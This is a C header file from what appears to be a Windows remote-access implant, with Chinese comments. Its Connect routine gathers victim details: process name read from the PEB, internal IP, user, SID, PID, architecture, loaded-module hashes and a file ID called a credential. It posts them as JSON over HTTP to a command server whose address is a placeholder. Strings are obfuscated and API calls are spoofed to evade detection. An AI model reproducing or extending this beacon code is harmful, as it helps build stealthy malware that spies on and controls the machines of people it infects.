#pragma once

#include "HTTP.h"

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	BYTE           Reserved1[16];
	PVOID          Reserved2[10];
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

int startHttp = 1;

wchar_t* GetProcessName() {
	DWORD_PTR _PEB = __readgsqword(0x60);
	PRTL_USER_PROCESS_PARAMETERS processParameters = (PRTL_USER_PROCESS_PARAMETERS) * (PDWORD_PTR)(_PEB + 0x20);
	return processParameters->ImagePathName.Buffer;
}

void Connect() {
	char* host = OBFSTR("0000:0000:0000:0000:0000:0000:0000:0001", "hostSIG");
	char* port = OBFSTR("01234", "portSIG");
	if (process == NULL) {
		size_t len;
		process = WStrToStr(GetProcessName(), &len);
	}
	if (connectTime.str == NULL) {
		char buf[50];
		char* format = OBFSTR("%04d.%02d.%02d %02d:%02d:%02d", "OBFSIG");
		SPOOF(wsprintfA, 8, buf, format, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
		connectTime = buf;
	}
	if (internalIP.str == NULL) {
		if (startHttp) {
			WSADATA lpWSAData;
			if (SPOOF(WSAStartup, 2, MAKEWORD(2, 2), &lpWSAData)) {
				return;
			}
			startHttp = 0;
		}
		BYTE buf[15000];
		ULONG outBufLen = 15000;
		PIP_ADAPTER_ADDRESSES pAddresses = (PIP_ADAPTER_ADDRESSES)&buf;
		if (SPOOF(GetAdaptersAddresses, 5, AF_INET, GAA_FLAG_INCLUDE_GATEWAYS, NULL, pAddresses, &outBufLen) == ERROR_SUCCESS) {
			while (pAddresses != NULL) {
				if (pAddresses->FirstGatewayAddress != NULL) {
					PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pAddresses->FirstUnicastAddress;
					while (pUnicast != NULL) {
						char* ip = SPOOF(inet_ntoa, 1, ((PSOCKADDR_IN)pUnicast->Address.lpSockaddr)->sin_addr);
						if (ip != NULL) {
							internalIP = ip;
							break;
						}
						pUnicast = pUnicast->Next;
					}
				}
				pAddresses = pAddresses->Next;
			}
		}
	}

	// 会话信息
	if (updateSessionInfo) {
		sessionInfo.Set(OBFSTR("os", "OBFSIG"), OBFSTR("windows", "OBFSIG"));
		sessionInfo.Set(OBFSTR("sid", "OBFSIG"), sid);
		sessionInfo.Set(OBFSTR("internal", "OBFSIG"), internalIP);
		sessionInfo.Set(OBFSTR("user", "OBFSIG"), user);
		sessionInfo.Set(OBFSTR("process", "OBFSIG"), process);
#if defined(_M_IX86)
		sessionInfo.Set(OBFSTR("arch", "OBFSIG"), OBFSTR("x86", "OBFSIG"));
#else
		sessionInfo.Set(OBFSTR("arch", "OBFSIG"), OBFSTR("x64", "OBFSIG"));
#endif
		sessionInfo.Set(OBFSTR("pid", "OBFSIG"), pid);
		sessionInfo.Set(OBFSTR("fid", "OBFSIG"), OBFSTR("12345678-1234-1234-1234-123456789012", "fidSIG")); // FileId 相当于凭证
		sessionInfo.Set(OBFSTR("connectTime", "OBFSIG"), connectTime);
		sessionInfo.Set(OBFSTR("hashInfo", "OBFSIG"), hashInfo.GetJson()); // 已加载的 ExeLite 的 Hash 与导出函数信息
		updateSessionInfo = 0;
	}
	outputInfo.Set(OBFSTR("sessionInfo", "OBFSIG"), sessionInfo);

	// 异步命令输出
	SPOOF(EnterCriticalSection, 1, &cs); // 多线程保护
	if (asyncOutputInfo.length) {
		outputInfo += asyncOutputInfo;
		asyncOutputInfo.DestroyHeap();
	}
	SPOOF(LeaveCriticalSection, 1, &cs);

	// 连接服务端
	stringObj outputJson = outputInfo.GetJson();
	if (!outputJson.length) {
		return;
	}
	if (HttpConnect(host, port, outputJson)) {
		outputInfo.DestroyHeap();
	}
}